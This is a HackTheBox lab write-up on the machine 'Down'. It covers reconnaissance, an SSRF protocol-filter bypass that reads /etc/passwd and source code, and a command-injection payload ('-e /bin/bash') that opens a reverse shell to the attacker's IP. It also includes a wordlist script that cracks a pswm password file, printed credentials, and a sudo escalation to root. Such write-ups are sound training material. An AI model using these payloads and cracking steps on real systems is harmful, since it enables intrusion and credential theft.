---
title: Down - SSRF Protocol Filter Bypass leading to Arbitrary File Read
date: 2024-12-08 00:00:00 +0000
categories: [HackTheBox Writeups]
tags: [hackthebox, linux]
---

```
ares@legion:~/HackTheBox/Down$ sudo nmap -sVC -A -T4 $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 18:21 EST
Nmap scan report for 10.129.234.87 (10.129.234.87)
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
|_  256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Is it down or just me?
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   43.92 ms 10.10.14.1 (10.10.14.1)
2   44.03 ms 10.129.234.87 (10.129.234.87)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
```

Have the server send a request to your host and watch it with `nc` or Wireshark.
![20251122012906.png](/assets/img/htb-writeups/Pasted image 20251122012906.png)

```
ffuf -u 'http://10.129.234.87/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.txt,.bak -mc 200,301,302
```


Sniper attack in burp intruder with /usr/share/seclists/Fuzzing/special-chars.txt
![20251122020203.png](/assets/img/htb-writeups/Pasted image 20251122020203.png)

```
curl -X POST http://10.129.234.87/index.php -d "url=http://+file:///etc/passwd"
```
![20251122015953.png](/assets/img/htb-writeups/Pasted image 20251122015953.png)

Read source code:
```
curl -X POST http://10.129.234.87/index.php -d "url=http://+file:///var/www/html/index.php"
```


RCE payload:
update GET to POST
?expermode=tcp
ip=10.10.14.97&port=1337+-e+/bin/bash
![20251122021236.png](/assets/img/htb-writeups/Pasted image 20251122021236.png)
nv -nvlp 1337

```
www-data@down:/home/aleks/.local/share/pswm

cat pswm
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==www-data@down:/home/aleks/.local/share/pswm$ 
```

https://github.com/Julynx/pswm

download pswm file to kali

python3 decrypt.py
```
import cryptocode
import os

def encrypted_file_to_lines(file_name, master_password):
    if not os.path.isfile(file_name):
        return ""
    with open(file_name, 'r') as file:
        encrypted_text = file.read()
    decrypted_text = cryptocode.decrypt(encrypted_text, master_password)
    if decrypted_text is False:
        return False
    decrypted_lines = decrypted_text.splitlines()
    print(master_password)
    print(decrypted_lines)
    return decrypted_lines

# Use the exact same wordlist path
words = open("/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt", 'r', errors="ignore").readlines()

for word in words:
    result = encrypted_file_to_lines('pswm', word.strip())
    if result and result != False:
        print(f"[SUCCESS] Found with password: {word.strip()}")
        break

```
![20251122023620.png](/assets/img/htb-writeups/Pasted image 20251122023620.png)
```
ares@legion:~/HackTheBox/Down$ python3 decrypt.py 
flower
['pswm\taleks\tflower', 'aleks@down\taleks\t1uY3w22uc-Wr{xNHR~+E']
[SUCCESS] Found with password: flower
```

```
ssh aleks@10.129.234.87
aleks@down:~$ sudo -l
[sudo] password for aleks: 
Matching Defaults entries for aleks on down:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User aleks may run the following commands on down:
    (ALL : ALL) ALL

sudo su
root@down:~# id
uid=0(root) gid=0(root) groups=0(root)

```


